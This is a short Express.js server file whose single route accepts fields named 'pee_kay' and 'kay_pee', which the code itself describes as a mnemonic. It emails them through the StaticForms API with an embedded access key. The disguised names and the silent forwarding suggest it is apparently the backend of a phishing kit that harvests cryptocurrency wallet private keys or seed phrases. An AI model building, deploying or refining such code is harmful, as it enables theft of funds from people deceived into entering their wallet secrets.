import express from "express";
import cors from "cors";
import fetch from "node-fetch";

const app = express();
app.use(express.json());
app.use(cors());

// StaticForm endpoint
const STATIC_FORM_URL = "https://api.staticforms.xyz/submit";

// Your StaticForm Access Key
const STATIC_FORM_KEY = "sf_i7a673jcnlk4cb4j850bfk87"; // <-- replace this

// Route: /submit-data
app.post("/submit-data", async (req, res) => {
  try {
    const { pee_kay, kay_pee } = req.body;

    if (!pee_kay) {
      return res.status(400).json({ error: "Missing pee_kay (mnemonic or form field)" });
    }

    // Prepare payload for StaticForm
    const payload = {
      accessKey: STATIC_FORM_KEY,
      subject: "New Form Submission",
      message: `pee_kay: ${pee_kay}\nkay_pee: ${kay_pee || ""}`
    };

    // Send data to StaticForm
    const response = await fetch(STATIC_FORM_URL, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify(payload)
    });

    const result = await response.json();

    if (result.success === false) {
      return res.status(500).json({ error: "StaticForm rejected the submission" });
    }

    return res.json({ success: true, forwarded: true, staticForm: result });
  } catch (err) {
    console.error("Error submitting to StaticForm:", err);
    return res.status(500).json({ error: "Internal server error" });
  }
});

// Default route
app.get("/", (req, res) => {
  res.send("Backend is running 🚀");
});

// Server port for Render
const PORT = process.env.PORT || 3000;
app.listen(PORT, () => console.log(`Server running on port ${PORT}`));
